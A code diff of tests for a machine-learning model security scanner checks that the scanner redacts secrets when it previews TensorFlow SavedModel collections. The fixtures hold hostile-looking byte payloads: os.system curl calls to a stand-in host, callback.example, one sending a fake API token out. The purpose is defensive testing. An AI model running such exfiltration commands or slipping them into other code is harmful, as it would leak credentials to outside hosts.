@@ -2064,10 +2064,9 @@ def test_savedmodel_collection_preview_redacts_sensitive_values(tmp_path: Path) 
     collection_payload = (
         f'os.system("curl https://callback.example/hook?token={raw_secret}")\napi_key="{raw_secret}"\n'
     ).encode()
-    model_path = _create_test_savedmodel_with_collection(
+    model_path = _create_test_savedmodel_with_scoped_nodes(
         tmp_path,
-        key="runtime_hook",
-        value=collection_payload,
+        collection_values={"runtime_hook": [collection_payload]},
         model_name="collection_preview_secret",
     )
 
@@ -2086,10 +2085,9 @@ def test_savedmodel_collection_preview_redacts_sensitive_values(tmp_path: Path) 
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_savedmodel_collection_key_details_redact_sensitive_values(tmp_path: Path) -> None:
     raw_secret = "sk-proj-CAND061SAVEDCOLLECTIONSECRET000000"
-    model_path = _create_test_savedmodel_with_collection(
+    model_path = _create_test_savedmodel_with_scoped_nodes(
         tmp_path,
-        key=f"runtime_hook_{raw_secret}",
-        value=b'os.system("curl https://callback.example/public")',
+        collection_values={f"runtime_hook_{raw_secret}": [b'os.system("curl https://callback.example/public")']},
         model_name="collection_key_secret",
     )
 
@@ -2938,33 +2936,6 @@ def test_tf_savedmodel_scanner_unreadable_file(tmp_path: Path, requires_symlinks
 def _create_test_savedmodel_with_op(tmp_path: Path, op_name: str, model_name: str | None = None) -> str:
     """Helper function to create a test SavedModel with a specific TensorFlow operation."""
     return _create_test_savedmodel_with_ops(tmp_path, [op_name], model_name)
-
-
-def _create_test_savedmodel_with_collection(
-    tmp_path: Path,
-    *,
-    key: str,
-    value: bytes,
-    model_name: str,
-) -> str:
-    """Create a SavedModel with one bytes collection entry."""
-    import importlib
-
-    importlib.import_module("modelaudit.protos")
-    from tensorflow.core.protobuf.saved_model_pb2 import SavedModel
-
-    model_dir = tmp_path / model_name
-    model_dir.mkdir()
-
-    saved_model = SavedModel()
-    meta_graph = saved_model.meta_graphs.add()
-    meta_graph.meta_info_def.tags.append("serve")
-    meta_graph.collection_def[key].bytes_list.value.append(value)
-
-    (model_dir / "saved_model.pb").write_bytes(saved_model.SerializeToString())
-    (model_dir / "variables").mkdir()
-
-    return str(model_dir)
 
 
 def _create_test_savedmodel_with_scoped_nodes(
